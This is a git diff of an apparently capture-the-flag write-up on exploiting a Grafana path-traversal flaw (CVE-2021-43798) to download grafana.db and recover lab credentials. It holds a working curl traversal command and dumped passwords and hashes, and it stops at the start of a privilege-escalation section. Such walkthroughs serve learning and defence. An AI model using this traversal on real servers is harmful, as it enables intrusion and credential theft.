@@ -6,12 +6,12 @@ PORT 80 running a hugo site which a static site generater framework
 PORT 3000 running Grafana. A grafical monitering tool   
 PORT 3306 running mysql   
 
-unauthenticated LFI vuln in grafana version 3.2.0   
+unauthenticated path traversal vuln in grafana version 3.2.0   
 Referance [https://www.exploit-db.com/exploits/50581]( https://www.exploit-db.com/exploits/50581)   
-More about LFI [https://j0vsec.com/post/cve-2021-43798/](https://j0vsec.com/post/cve-2021-43798/)   
+More about path traversal [https://j0vsec.com/post/cve-2021-43798/](https://j0vsec.com/post/cve-2021-43798/)   
 
-Exploit LFI using a python script 
-Default config of grafana is using sqlite3 and store the file on /var/lib/grafana/grafana.db
+**FOOTHOLD**    
+Default config of grafana is using sqlite3 and the db file store on /var/lib/grafana/grafana.db
 
 Downloading Grafana.db
 
@@ -19,23 +19,25 @@ Downloading Grafana.db
 curl --path-as-is "http://10.129.208.1:3000/public/plugins/state-timeline/../../../../../../../../../../../../../var/lib/grafana/grafana.db" -O grafana.db
 ```
 
-Found some creds
+Found Mysql Creds
 ```bash
 Username:grafana
 password:dontStandSoCloseToMe63221!
 Database:grafana
 ```
-Grafana login cred
+Grafana login Creds
 ```bash
 username:admin
 password:dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069
 salt:0X27trve2u
 ````
-User creds
+connect mysql using creds and found another creds from whackywedget database      
+
+User Creds 
 ```bash
 developer:YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==:anEnglishManInNewYork027468
 ```
-Privilege escalation
+**PRIVILEAGE ESCALATION**
 
 Found token from local git commit of my-app in opt dir
 ```bash
